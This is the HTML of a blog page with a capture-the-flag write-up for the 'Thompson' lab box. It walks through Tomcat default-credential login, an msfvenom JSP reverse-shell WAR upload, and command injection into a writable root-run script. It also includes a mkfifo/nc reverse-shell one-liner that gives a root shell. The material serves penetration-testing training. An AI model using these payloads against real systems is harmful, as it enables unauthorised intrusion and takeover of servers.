<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/avatar.jpg"/><link rel="stylesheet" href="/_next/static/css/f194b09a73f2e100.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-6bf358eca9a0310b.js"/><script src="/_next/static/chunks/4bd1b696-db28424fe4d701e0.js" async=""></script><script src="/_next/static/chunks/517-e8f1eb4c9a59fc78.js" async=""></script><script src="/_next/static/chunks/main-app-431dcfd7004f3945.js" async=""></script><script src="/_next/static/chunks/4bd22374-02665d04d05c313a.js" async=""></script><script src="/_next/static/chunks/173-546eff084523247c.js" async=""></script><script src="/_next/static/chunks/541-541f11c0e5eb1c3a.js" async=""></script><script src="/_next/static/chunks/699-8ccf16d8cedd9191.js" async=""></script><script src="/_next/static/chunks/app/cyber/writeup/thompson/page-e5cf399bd2eea0a9.js" async=""></script><link rel="icon" href="/avatar.jpg"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="Wrapper"><div><div class="burger-menu">â˜° <!-- -->            </div><div class="sidebarLeft "><div class="avatar"><img src="/avatar.jpg" alt="Avatar"/></div><ul><a href="/"><li>Search</li></a><a href="/cyber/writeup"><li>Writeups</li></a><a href="/cyber/blog"><li>Blog</li></a><a href="/cyber/tags"><li>Tags</li></a><a href=""><li style="color:#555555">Resources</li></a><a href="/cyber/cheat-sheet"><li>Cheat sheets</li></a></ul></div></div><div class="content"><div class="Post"><div><div id="Thompson"><div><h1> <span style="color:#da1953">Tho</span>mpson</h1><hr></div><div id="banner"><div><img src="/cyber/writeup/thompson/banner.gif" alt=""></div></div><div id="Scanning"><div><hr><h1><span style="color:#da1953">Sca</span>nning</h1></div><div><p><pre># Nmap 7.94SVN scan initiated Thu Feb  6 08:32:29 2025 as: nmap -sC -sV -oN nmap 10.10.23.2<br>Nmap scan report for 10.10.23.2<br>Host is up (0.025s latency).<br>Not shown: 997 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)<br>|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)<br>|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)<br>8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)<br>|_ajp-methods: Failed to get a valid response for the OPTION request<br>8080/tcp open  http    Apache Tomcat 8.5.5<br>|_http-favicon: Apache Tomcat<br>|_http-title: Apache Tomcat/8.5.5<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Feb  6 08:32:37 2025 -- 1 IP address (1 host up) scanned in 8.30 seconds</pre></p></div><div><p>I have 3 pen ports: 22 ssh, 8009 ajp13 (Apache Jserv) and 8080 http (Tomcat).</p></div></div><div id="Tomcat-credentials"><div><h1><span style="color:#da1953">Tom</span>cat credentials</h1></div><div><p>Accesssing the address <i>http://challenge.ip:8080</i> I am able to access the tomcat home page.</p></div><div><p><img src="/cyber/writeup/thompson/tomcathome.PNG"></p></div><div><p>By Clicking "Manage App" I can attemp a log into the admin panel.</p></div><div><p><img src="/cyber/writeup/thompson/login.PNG"></p></div><div><p>The default credentials are <b>tomcat:s3cret</b> which I guessed tried some common combination of username and password form this <a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">link</a>.</p></div><div><p>Once logged in I had the possibility to upload a WAR file.</p></div><div><p><img src="/cyber/writeup/thompson/upload.jpg"></p></div></div><div id="Reverse-Shell"><div><h1><span style="color:#da1953">Rev</span>ers shell</h1></div><div><p>To craft the WAR file I have used MSFVENOM, and I found the comand line on <a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">Google</a>. The line I used was "non-meterpreter web payload (WAR)": <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.<br>ENTER<br>ENTER</code>. Once created the file and uploaded I started a NetCat linstener and then visited the uploaded WAR file Link.</p></div><div><p><img src="/cyber/writeup/thompson/reverseshell.PNG"></p></div><div><p>I have a non interative shell. To upgrade it to an interactive shell I used the fllowing commands:</p></div><div><p><pre>/usr/bin/script -qc /bin/bash /dev/null<br>CTRZ+Z<br>stty raw -echo; fg; reset</pre></p></div><div><p><img src="/cyber/writeup/thompson/upgradedshell.PNG"></p></div><div></div></div><div id="Code-execution"><div><h1><span style="color:#da1953">Cod</span>e execution</h1></div><div><p>Obviously, the first thing that came to my mind was to look for the user flag in the home directory.</p></div><div><p><pre>tomcat@ubuntu:/$ cd /home/jack/<br>tomcat@ubuntu:/home/jack$ ls -la<br>total 48<br>drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .<br>drwxr-xr-x 3 root root 4096 Aug 14  2019 ..<br>-rw------- 1 root root 1476 Aug 14  2019 .bash_history<br>-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout<br>-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc<br>drwx------ 2 jack jack 4096 Aug 14  2019 .cache<br>-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh<br>drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano<br>-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile<br>-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful<br>-rw-r--r-- 1 root root   39 Feb  7 05:14 test.txt<br>-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt<br>-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts</pre></p></div><div><p>Here I can see that not only I am able to retrieve the flag but there is a script name <b>id.sh</b> that has read and write permission. By opening the file it is clear that it is executing the command <b>id</b> and saving the output in the file named <i>text.txt</i>.</p></div><div><p><pre>tomcat@ubuntu:/home/jack$ cat user.txt<br>39400c90bc683a41a8935e4719f181bf</pre></p></div><div><p><pre>tomcat@ubuntu:/home/jack$ cat id.sh<br>#!/bin/bash<br>id > test.txt</pre></p></div><div><p>Having read and write permission on <i>id.sh</i> I was able to enumerate the sudo privilege to check which command the user jack was able to execute as sudo without the password. The command used to enumerate was <code>sudo -l</code> and the command used to inject the code inside the <i>id.sh</i> file was <code>echo -e '#!/bin/bash'"\nsudo -l > text.txt" > /home/jack/id.sh</code></p></div><div><p><pre>tomcat@ubuntu: echo -e '#!/bin/bash'"
sudo -l > text.txt" > /home/jack/id.sh              <br>tomcat@ubuntu:/home/jack$ cat id.sh <br>#!/bin/bash<br>sudo -l > text.txt<br>tomcat@ubuntu:/home/jack$ cat text.txt <br>Matching Defaults entries for root on ubuntu:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User root may run the following commands on ubuntu:<br>    (ALL : ALL) ALL</pre></p></div></div><div id="Shell-as-root"><div><h1><span style="color:#da1953">Shel</span>l as root</h1></div><div><p>This means that I can execute all commands as sudo without the password. It also means that I can execute a reverse shell with <b>sudo</b> to obtain access as root. The command to inject the payload is: <code>echo -e '#!/bin/bash'"
sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.112.161 5555 >/tmp/f" > /home/jack/id.sh</code>. Before executing the command I have to open a NetCat (NC) listener on port 5555 matching the payload port number.</p></div><div><p><pre><b>$</b> nc -lvnp 5555<br>listening on [any] 5555 ...<br>connect to [10.21.112.161] from (UNKNOWN) [10.10.247.245] 38362<br>/bin/sh: 0: can't access tty; job control turned off<br># whoami<br>root<br># cat /root/root.txt<br>d89d5391984c0450a95497153ae7ca3a  </pre></p></div></div></div> </div></div></div><div class="sidebarRight"><div class="sidebarRightChild"><h2>Index</h2><div></div><br/><h2>Tags</h2><div class="tags"><a style="margin-top:10px" href="/cyber/tags?searchTag=box"><my-tag>box</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=ctf"><my-tag>ctf</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=easy"><my-tag>easy</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=linux"><my-tag>linux</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=login+panel"><my-tag>login panel</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=nc"><my-tag>nc</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=nsfvenom"><my-tag>nsfvenom</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=oscp"><my-tag>oscp</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=privesc"><my-tag>privesc</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=rce"><my-tag>rce</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=reverse+shell"><my-tag>reverse shell</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=thm"><my-tag>thm</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=upgrade+shell"><my-tag>upgrade shell</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=user+enumeration"><my-tag>user enumeration</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=web"><my-tag>web</my-tag></a></div></div></div></div><script src="/_next/static/chunks/webpack-6bf358eca9a0310b.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5244,[],\"\"]\n3:I[3866,[],\"\"]\n4:I[3108,[\"667\",\"static/chunks/4bd22374-02665d04d05c313a.js\",\"173\",\"static/chunks/173-546eff084523247c.js\",\"541\",\"static/chunks/541-541f11c0e5eb1c3a.js\",\"699\",\"static/chunks/699-8ccf16d8cedd9191.js\",\"438\",\"static/chunks/app/cyber/writeup/thompson/page-e5cf399bd2eea0a9.js\"],\"default\"]\n5:I[5897,[\"667\",\"static/chunks/4bd22374-02665d04d05c313a.js\",\"173\",\"static/chunks/173-546eff084523247c.js\",\"541\",\"static/chunks/541-541f11c0e5eb1c3a.js\",\"699\",\"static/chunks/699-8ccf16d8cedd9191.js\",\"438\",\"static/chunks/app/cyber/writeup/thompson/page-e5cf399bd2eea0a9.js\"],\"default\"]\n6:I[8845,[\"667\",\"static/chunks/4bd22374-02665d04d05c313a.js\",\"173\",\"static/chunks/173-546eff084523247c.js\",\"541\",\"static/chunks/541-541f11c0e5eb1c3a.js\",\"699\",\"static/chunks/699-8ccf16d8cedd9191.js\",\"438\",\"static/chunks/app/cyber/writeup/thompson/page-e5cf399bd2eea0a9.js\"],\"default\"]\n7:I[6213,[],\"OutletBoundary\"]\n9:I[6213,[],\"MetadataBoundary\"]\nb:I[6213,[],\"ViewportBoundary\"]\nd:I[4835,[],\"\"]\n:HL[\"/_next/static/css/f194b09a73f2e100.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"7Jl2btp1RsasvrrQCTTkO\",\"p\":\"\",\"c\":[\"\",\"cyber\",\"writeup\",\"thompson\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"cyber\",{\"children\":[\"writeup\",{\"children\":[\"thompson\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[\"$\",\"div\",null,{\"children\":[\"$\",\"center\",null,{\"children\":[\"Page not found\",[\"$\",\"br\",null,{}],\"You have followed and old link that does not work anymore\",[\"$\",\"br\",null,{}],\"The site has migrated from React app to NextJS app\"]}]}]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"cyber\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"writeup\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"thompson\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\",\"thompson\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"Wrapper\",\"children\":[[\"$\",\"$L4\",null,{}],[\"$\",\"div\",null,{\"className\":\"content\",\"children\":[\"$\",\"div\",null,{\"className\":\"Post\",\"children\":[\"$\",\"$L5\",null,{\"postname\":\"writeupdb/thompson.json\"}]}]}],[\"$\",\"$L6\",null,{\"postname\":\"writeupdb/thompson.json\"}]]}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/f194b09a73f2e100.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$L7\",null,{\"children\":\"$L8\"}]]}],{},null,false]},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"-GF_-aAlUZkizBj1qUyT7\",{\"children\":[[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"children\":\"$Lc\"}],null]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\na:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"link\",\"1\",{\"rel\":\"icon\",\"href\":\"/avatar.jpg\"}]]\n"])</script><script>self.__next_f.push([1,"8:null\n"])</script></body></html>